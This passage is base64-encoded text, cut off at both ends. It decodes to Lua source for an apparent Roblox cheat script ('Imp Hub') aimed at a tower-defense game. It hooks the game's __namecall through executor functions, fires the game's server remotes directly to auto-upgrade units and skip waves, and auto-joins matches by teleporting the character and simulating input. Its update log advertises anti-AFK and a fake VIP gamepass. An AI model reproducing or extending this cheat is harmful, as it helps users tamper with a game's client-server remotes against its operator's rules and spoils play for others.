QKICAgICAgICAgICAgICAgICB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUGFja2FnZXMiKTpXYWl0Rm9yQ2hpbGQoIl9JbmRleCIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgInNsZWl0bmlja19rbml0QDEuNy4wIgogICAgICAgICAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJrbml0Iik6V2FpdEZvckNoaWxkKCJTZXJ2aWNlcyIpOldhaXRGb3JDaGlsZCgiR2FtZVNlcnZpY2UiKTpXYWl0Rm9yQ2hpbGQoIlJGIik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgICAgICAgICAiVm90ZVNraXBSb3VuZCIKICAgICAgICAgICAgICAgICAgICApOkludm9rZVNlcnZlcigpCiAgICAgICAgICAgICAgICAgICAgQWN0aW9uc0NvbXBsZXRlZCA9IEFjdGlvbnNDb21wbGV0ZWQgKyAxCiAgICAgICAgICAgICAgICAgICAgQ29tcGxldGVkQWN0aW9uc1tpXSA9IHRydWUKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIGNsaWNrYnV0dG9uKGJ1dHRvbikKICAgIGlmIGJ1dHRvbiB0aGVuCiAgICAgICAgR1MuU2VsZWN0ZWRPYmplY3QgPSBidXR0b24KICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgIFZJTTpTZW5kS2V5RXZlbnQodHJ1ZSwgMTMsIGZhbHNlLCBnYW1lKQogICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgVklNOlNlbmRLZXlFdmVudChmYWxzZSwgMTMsIGZhbHNlLCBnYW1lKQogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgR1MuU2VsZWN0ZWRPYmplY3QgPSBuaWwKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIFRlbGVwb3J0VG9Mb2JieSgpCiAgICBsb2NhbCBTZXJ2ZXJzID0KICAgICAgICBIdHRwOkpTT05EZWNvZGUoCiAgICAgICAgZ2FtZTpIdHRwR2V0KAogICAgICAgICAgICAiaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLyIgLi4KICAgICAgICAgICAgICAgIHRvc3RyaW5nKDEyMzY2MjI0MzEwMDY4MCkgLi4gIi9zZXJ2ZXJzL1B1YmxpYz9zb3J0T3JkZXI9QXNjJmxpbWl0PTEwMCIKICAgICAgICApCiAgICApLmRhdGEKICAgIGxvY2FsIFJhbmRvbVNlcnZlciA9IFNlcnZlcnNbbWF0aC5yYW5kb20oMSwgI1NlcnZlcnMpXQogICAgVFM6VGVsZXBvcnRUb1BsYWNlSW5zdGFuY2UoMTIzNjYyMjQzMTAwNjgwLCBSYW5kb21TZXJ2ZXIuaWQsIFBscikKZW5kCgppZiBob29rbWV0YW1ldGhvZCB0aGVuCiAgICBob29rID0KICAgICAgICBob29rbWV0YW1ldGhvZCgKICAgICAgICBnYW1lLAogICAgICAgICJfX25hbWVjYWxsIiwKICAgICAgICBmdW5jdGlvbihzZWxmLCAuLi4pCiAgICAgICAgICAgIGlmIFJlY29yZGluZyB0aGVuCiAgICAgICAgICAgICAgICBpZiBub3QgY2hlY2tjYWxsZXIoKSBhbmQgZ2V0bmFtZWNhbGxtZXRob2QoKSA9PSAiSW52b2tlU2VydmVyIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsuLi59CiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5OYW1lID09ICJWb3RlU3RhcnRSb3VuZCIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBTYXZlQWN0aW9uKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlN0YXJ0R2FtZSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2F2ZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuR2FtZVVJLlRvcC5NYWluLlN0YWdlSW5mby5GcmFtZS5DdXJyZW50V2F2ZS5UZXh0OmdzdWIoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIlRCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBob29rKHNlbGYsIHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgc2VsZi5OYW1lID09ICJWb3RlU2tpcFJvdW5kIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFNhdmVBY3Rpb24oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiU2tpcCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2F2ZSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuR2FtZVVJLlRvcC5NYWluLlN0YWdlSW5mby5GcmFtZS5DdXJyZW50V2F2ZS5UZXh0OmdzdWIoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIlRCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBob29rKHNlbGYsIHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgcmV0dXJuIGhvb2soc2VsZiwgLi4uKQogICAgICAgIGVuZAogICAgKQplbmQKCnBjYWxsKAogICAgZnVuY3Rpb24oKQogICAgICAgIGZvciBpLCB2IGluIGlwYWlycygKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLlF1ZXVlU2NyZWVuLk1haW4uU2VsZWN0aW9uU2NyZWVuLk1haW4uU3RhZ2VTZWxlY3QuV29ybGRTZWxlY3QuQ29udGVudC5TdGFnZXM6R2V0Q2hpbGRyZW4oCgogICAgICAgICAgICApCiAgICAgICAgKSBkbwogICAgICAgICAgICBpZiB2OklzQSgiVGV4dEJ1dHRvbiIpIGFuZCB2Lk5hbWUgfj0gIkNvbWluZ1Nvb24iIHRoZW4KICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChTdGFnZXMsIHYuTmFtZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKKQoKVGFicy5Mb2c6QWRkU2VjdGlvbigiVXBkYXRlIExvZyDwn5OGIikKClRhYnMuTG9nOkFkZFBhcmFncmFwaCgKICAgIHsKICAgICAgICBUaXRsZSA9ICJVcGRhdGUgVjEuMCB8IDEtNC0yNSIsCiAgICAgICAgQ29udGVudCA9IFtbCiAgICAtIFJlbGVhc2VkLgogICAgXV0KICAgIH0KKQoKVGFicy5Mb2c6QWRkUGFyYWdyYXBoKAogICAgewogICAgICAgIFRpdGxlID0gIlVwZGF0ZSBWMS4wMiB8IDEtNS0yNSIsCiAgICAgICAgQ29udGVudCA9IFtbCiAgICAtIENvcHkgTWFjcm8gSlNPTiBTdHJpbmcuCiAgICBdXQogICAgfQopCgpUYWJzLkxvZzpBZGRQYXJhZ3JhcGgoCiAgICB7CiAgICAgICAgVGl0bGUgPSAiVXBkYXRlIFYxLjAzIHwgMS01LTI1IiwKICAgICAgICBDb250ZW50ID0gW1sKICAgIC0gQW50aSBBRksgT24gRXhlY3V0ZSwKICAgID4gV2ViaG9va3MgSW1wcm92ZW1lbnRzLAogICAgPiBNb3JlIENvbnRlbnQgT24gV2ViaG9va3MsCiAgICA+IFN0YWJpbGl6ZWQgTW9yZSBUaGUgU2NyaXB0LAogICAgPiBMZXNzIExhZy4KICAgIF1dCiAgICB9CikKClRhYnMuTG9nOkFkZFBhcmFncmFwaCgKICAgIHsKICAgICAgICBUaXRsZSA9ICJVcGRhdGUgVjEuMDM1IHwgMS03LTI1IiwKICAgICAgICBDb250ZW50ID0gW1sKICAgICAtIEZpeGVkIE1hY3JvIE5vdCBTYXZpbmcgT24gT3RoZXJzIEV4ZWN1dG9ycyBUaGF0IFdhcyBOb3QgRGVsdGEuCiAgICAgXV0KICAgIH0KKQoKVGFicy5Mb2c6QWRkUGFyYWdyYXBoKAogICAgewogICAgICAgIFRpdGxlID0gIlVwZGF0ZSBWMS4xIHwgMS03LTI1IiwKICAgICAgICBDb250ZW50ID0gW1sKICAgICAtIExlYXZlIE9uIFdhdmUsCiAgICAgLSBPcGVuIFVwZ3JhZGUgR3VpIE9uIFVwZ3JhZGVkIFVuaXQsCiAgICAgLSBBZGRlZCBNb3JlIE1hY3JvIEFjdGlvbnMge1N0YXJ0IEdhbWUsIFNraXAgV2F2ZX0sCiAgICAgPiBNdWNoIE1vcmUgSW1wcm92ZW1lbnRzLgogICAgIF1dCiAgICB9CikKClRhYnMuTG9nOkFkZFBhcmFncmFwaCgKICAgIHsKICAgICAgICBUaXRsZSA9ICJVcGRhdGUgVjEuMTMgfCAxLTEzLTI1IiwKICAgICAgICBDb250ZW50ID0gW1sKCSAgIC0gTmV3IFRhYiAoSm9pbiBHYW1lKSwKCSAgIC0gU2VsZWN0IFN0YWdlLAoJICAgLSBTZWxlY3QgQWN0LAoJICAgLSBTZWxlY3QgRGlmZmljdWx0LAoJICAgLSBFbmFibGUgU3RhcnQgR2FtZSBPbiBKb2luLAoJICAgLSBBdXRvbWF0aWMgSm9pbiBHYW1lLgoJICAgXV0KICAgIH0KKQoKVGFicy5Mb2c6QWRkUGFyYWdyYXBoKAogICAgewogICAgICAgIFRpdGxlID0gIlVwZGF0ZSBWMS4xNiB8IDEtMTktMjUiLAogICAgICAgIENvbnRlbnQgPSBbWwoJICAtIFNldCBYMyBTcGVlZCBbR2FtZXBhc3MgUmVxdWlyZWRdLAoJICAtIEFsbG93IFBpbmcgRXZlcnlvbmUsCgkgIC0gRnJlZSBWSVAgR2FtZXBhc3MgW1Zpc3VhbF0sCgkgIC0gRnJlZSBVbHRyYSBWSVAgR2FtZXBhc3MgW1Zpc3VhbF0sCgkgID4gRml4ZWQgQW5kIEltcHJvdmVkIE1hY3JvLAoJICA+IFdlYmhvb2tzIFdpbGwgQWxzbyBTaG93IFlvdSBUaGUgUGxheWVyIExldmVsIEFmdGVyIENvbXBsZXRpbmcgQSBHYW1lLgoJICBdXQogICAgfQopCgpUYWJzLkxvZzpBZGRQYXJhZ3JhcGgoCiAgICB7CiAgICAgICAgVGl0bGUgPSAiVXBkYXRlIFYxLjE4IHwgMS0yMS0yNSIsCiAgICAgICAgQ29udGVudCA9IFtbCgkgIC0gQXV0b21hdGljIEpvaW4gUmFuZG9tIENoYWxsZW5nZSwKCSAgPiBBZGRlZCBVcGdyYWRlICYgUHJpb3JpdHkgQWN0aW9ucyBUbyBNYWNybywKCSAgLSBNYWNybyBSZWNvcmRlciBCdWcgRml4ZXMsCgkgICogT3RoZXJzIEltcHJvdmVtZW50cy4KCSAgXV0KICAgIH0KKQoKVGFicy5Kb2luOkFkZFNlY3Rpb24oIkpvaW5pbmcgR2FtZXMg8J+bqSIpCgpUYWJzLkpvaW46QWRkRHJvcGRvd24oCiAgICAic3RhZ2UiLAogICAgewogICAgICAgIFRpdGxlID0gIlN0YWdlIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICIiLAogICAgICAgIFZhbHVlcyA9IFN0YWdlcywKICAgICAgICBNdWx0aSA9IGZhbHNlLAogICAgICAgIERlZmF1bHQgPSAiIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIHN0YWdlID0gdAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLkpvaW46QWRkRHJvcGRvd24oCiAgICAiYWN0IiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJBY3QiLAogICAgICAgIERlc2NyaXB0aW9uID0gIiIsCiAgICAgICAgVmFsdWVzID0gQWN0cywKICAgICAgICBNdWx0aSA9IGZhbHNlLAogICAgICAgIERlZmF1bHQgPSAiIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIGFjdCA9IHQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5Kb2luOkFkZERyb3Bkb3duKAogICAgImRpZmYiLAogICAgewogICAgICAgIFRpdGxlID0gIkRpZmZpY3VsdHkiLAogICAgICAgIERlc2NyaXB0aW9uID0gIiIsCiAgICAgICAgVmFsdWVzID0gRGlmZmljdWx0aWVzLAogICAgICAgIE11bHRpID0gZmFsc2UsCiAgICAgICAgRGVmYXVsdCA9ICIiLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odCkKICAgICAgICAgICAgZGlmZiA9IHQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5Kb2luOkFkZFRvZ2dsZSgKICAgICJzdGFydGdtZSIsCiAgICB7CiAgICAgICAgVGl0bGUgPSAiU3RhcnQgR2FtZSIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiLSBXaWxsIFN0YXJ0IEdhbWUgT24gSm9pbiIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odCkKICAgICAgICAgICAgc3RhcnRnbWUgPSB0CiAgICAgICAgZW5kCiAgICB9CikKClRhYnMuSm9pbjpBZGRUb2dnbGUoCiAgICAiYXV0b2pvaW4iLAogICAgewogICAgICAgIFRpdGxlID0gIkF1dG9tYXRpYyBKb2luIEdhbWUiLAogICAgICAgIERlc2NyaXB0aW9uID0gIldpbGwgQ2hvb3NlIEEgSm9pbiBTcGFjZSBUaGF0IEFpbid0IFVzZWQgQWxyZWFkeSBBbmQgU2NyaXB0IFdpbGwgQ2hvb3NlIEFsbCBTZXR0aW5ncyBVIFNldCBCZWZvcmUsIFRoZW4gSXQgV2lsbCBTdGFydCBHYW1lIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBhdXRvam9pbiA9IHQKICAgICAgICAgICAgd2hpbGUgYXV0b2pvaW4gZG8KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjQpCiAgICAgICAgICAgICAgICBpZiBzdGFnZSBhbmQgYWN0IGFuZCBkaWZmIHRoZW4KICAgICAgICAgICAgICAgICAgICBwY2FsbCgKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gaXBhaXJzKHdvcmtzcGFjZS5NYXRjaG1ha2VyczpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYuUXVldWVJbmZvLlF1ZXVlSW5mby5TdGF0dXMuVGl0bGUuVGV4dCB+PSAiU2VsZWN0aW5nLi4uIiBhbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYuUXVldWVJbmZvLlF1ZXVlSW5mby5TdGF0dXMuVGl0bGUuVGV4dCB+PSAiIiBhbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vdCB2OkdldEF0dHJpYnV0ZSgiQ2hhbGxlbmdlIikgYW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJc0pvaW5pbmdHYW1lID09IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGxyLkNoYXJhY3RlcjpQaXZvdFRvKHY6R2V0UGl2b3QoKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSXNKb2luaW5nR2FtZSA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xpY2tidXR0b24oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuUXVldWVTY3JlZW4uTWFpbi5TZWxlY3Rpb25TY3JlZW4uTWFpbi5TdGFnZVNlbGVjdC5Xb3JsZFNlbGVjdC5Db250ZW50LlN0YWdlc1sKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFnZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsaWNrYnV0dG9uKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLlF1ZXVlU2NyZWVuLk1haW4uU2VsZWN0aW9uU2NyZWVuLk1haW4uU3RhZ2VTZWxlY3QuQ2hhcHRlclNlbGVjdC5BY3QxX0NoYXB0ZXJzWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJDaGFwdGVyXyIgLi4gYWN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xpY2tidXR0b24oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuUXVldWVTY3JlZW4uTWFpbi5TZWxlY3Rpb25TY3JlZW4uTWFpbi5TdGFnZVNlbGVjdC5JbmZvLkNvbnRlbnQuRGlmZmljdWx0aWVzWwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpZmYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xpY2tidXR0b24oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuUXVldWVTY3JlZW4uTWFpbi5TZWxlY3Rpb25TY3JlZW4uTWFpbi5PcHRpb25zLk9wdGlvbnMuQ29uZmlybQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxLjIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElzSm9pbmluZ0dhbWUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBzdGFydGdtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGlja2J1dHRvbigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5QbGF5ZXJHdWkuUXVldWVTY3JlZW4uTWFpbi5TdGFydFNjcmVlbi5NYWluLk9wdGlvbnMuU3RhcnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIEZsdWVudDpOb3RpZnkoCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRpdGxlID0gIkltcCBIdWIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29udGVudCA9ICJFcnJvciIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJDb250ZW50ID0gIllvdSBEaWRuJ3QgU2V0IEFsbCBUaGUgQ29uZmlndXJhdGlvbnMgRm9yIEF1dG9tYXRpYyBKb2luLiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5Kb2luOkFkZFRvZ2dsZSgKICAgICJhdXRvam9pbmNoYWxsZW5nZSIsCiAgICB7CiAgICAgICAgVGl0bGUgPSAiQXV0b21hdGljIEpvaW4gUmFuZG9tIENoYWxsZW5nZSIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiLSBXaWxsIEpvaW4gVG8gQSBSYW5kb20gQ2hhbGxlbmdlIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBhdXRvam9pbmNoYWxsZW5nZSA9IHQKICAgICAgICAgICAgd2hpbGUgYXV0b2pvaW5jaGFsbGVuZ2UgZG8KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgcGNhbGwoCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBpcGFpcnMod29ya3NwYWNlLk1hdGNobWFrZXJzOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHYuUXVldWVJbmZvLlF1ZXVlSW5mby5TdGF0dXMuVGl0bGUuVGV4dCB+PSAiU2VsZWN0aW5nLi4uIiBhbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdi5RdWV1ZUluZm8uUXVldWVJbmZvLlN0YXR1cy5UaXRsZS5UZXh0IH49ICIiIGFuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2OkdldEF0dHJpYnV0ZSgiQ2hhbGxlbmdlIikgYW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElzSm9pbmluZ0NoYWxsZW5nZSA9PSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJc0pvaW5pbmdDaGFsbGVuZ2UgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGxyLkNoYXJhY3RlcjpQaXZvdFRvKHY6R2V0UGl2b3QoKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9CikKClRhYnMuR2FtZTpBZGRTZWN0aW9uKCJVcGdyYWRpbmcgVW5pdHMg8J+TpSIpCgpUYWJzLkdhbWU6QWRkU2xpZGVyKAogICAgInVwZ2RlbGF5IiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJVcGdyYWRlIERlbGF5IiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICIiLAogICAgICAgIERlZmF1bHQgPSA2LAogICAgICAgIE1pbiA9IDEsCiAgICAgICAgTWF4ID0gNjAsCiAgICAgICAgUm91bmRpbmcgPSAxLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odCkKICAgICAgICAgICAgdXBnZGVsYXkgPSB0CiAgICAgICAgZW5kCiAgICB9CikKClRhYnMuR2FtZTpBZGRUb2dnbGUoCiAgICAidXBnIiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJVcGdyYWRlIFVuaXRzIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICItIFRoaXMgV2lsbCBVcGdyYWRlIEFsbCBZb3VyIFVuaXRzIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICB1cGcgPSB0CiAgICAgICAgICAgIHdoaWxlIHVwZyBkbwogICAgICAgICAgICAgICAgdGFzay53YWl0KHVwZ2RlbGF5KQogICAgICAgICAgICAgICAgcGNhbGwoCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBpcGFpcnMod29ya3NwYWNlLkZyaWVuZGxpZXM6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9zdHJpbmcodjpHZXRBdHRyaWJ1dGUoIk93bmVySWQiKSkgPT0gdG9zdHJpbmcoUGxyLlVzZXJJZCkgYW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHY6R2V0QXR0cmlidXRlKCJVcGdyYWRlIikgPCB2OkdldEF0dHJpYnV0ZSgiTWF4VXBncmFkZXMiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJQYWNrYWdlcyIpOldhaXRGb3JDaGlsZCgiX0luZGV4Iik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAic2xlaXRuaWNrX2tuaXRAMS43LjAiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTpXYWl0Rm9yQ2hpbGQoImtuaXQiKTpXYWl0Rm9yQ2hpbGQoIlNlcnZpY2VzIik6V2FpdEZvckNoaWxkKCJHYW1lU2VydmljZSIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlJGIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJVcGdyYWRlVG93ZXIiKTpJbnZva2VTZXJ2ZXIodjpHZXRBdHRyaWJ1dGUoIklkIikpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgb3Blbmd1aW9udXBnIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUGFja2FnZXMiKTpXYWl0Rm9yQ2hpbGQoIl9JbmRleCIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzbGVpdG5pY2tfa25pdEAxLjcuMCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTpXYWl0Rm9yQ2hpbGQoImtuaXQiKTpXYWl0Rm9yQ2hpbGQoIlNlcnZpY2VzIik6V2FpdEZvckNoaWxkKCJUb3dlclNlcnZpY2UiKTpXYWl0Rm9yQ2hpbGQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiUkYiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJTdWJzY3JpYmVUb1Rvd2VyIik6SW52b2tlU2VydmVyKHY6R2V0QXR0cmlidXRlKCJJZCIpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUGFja2FnZXMiKTpXYWl0Rm9yQ2hpbGQoIl9JbmRleCIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJzbGVpdG5pY2tfa25pdEAxLjcuMC